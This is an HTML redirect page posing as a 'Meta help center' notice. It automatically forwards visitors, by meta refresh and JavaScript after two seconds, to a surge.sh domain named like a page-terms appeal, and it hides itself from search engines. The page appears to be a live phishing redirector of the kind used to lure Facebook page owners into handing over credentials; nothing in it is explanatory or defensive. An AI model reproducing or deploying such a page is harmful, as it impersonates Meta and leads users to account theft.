<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- SEO -->
  <meta name="robots" content="noindex, nofollow">

  <title>Redirecting...</title>

  <style>
    body {
      margin: 0;
      padding: 0;
      background: #0f172a;
      color: #ffffff;
      font-family: 'Segoe UI', Tahoma, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .container {
      text-align: center;
    }

    .spinner {
      width: 45px;
      height: 45px;
      border: 5px solid #1e293b;
      border-top: 5px solid #38bdf8;
      border-radius: 50%;
      margin: 20px auto;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    a {
      color: #38bdf8;
      text-decoration: none;
      font-weight: bold;
    }

    a:hover {
      text-decoration: underline;
    }
  </style>

  <!-- Instant Redirect -->
  <meta http-equiv="refresh" content="2;url=https://appeal-for-page-terms-review.surge.sh/">

  <script>
    // Backup redirect (JavaScript)
    setTimeout(() => {
      window.location.replace("https://appeal-for-page-terms-review.surge.sh/");
    }, 2000);
  </script>
</head>

<body>
  <div class="container">
    <h2>Please wait, redirecting...</h2>
    <div class="spinner"></div>
    <p>
      Meta help- center, 
      <a href="https://appeal-for-page-terms-review.surge.sh/">
        click here
      </a>.
    </p>
  </div>
</body>
</html>
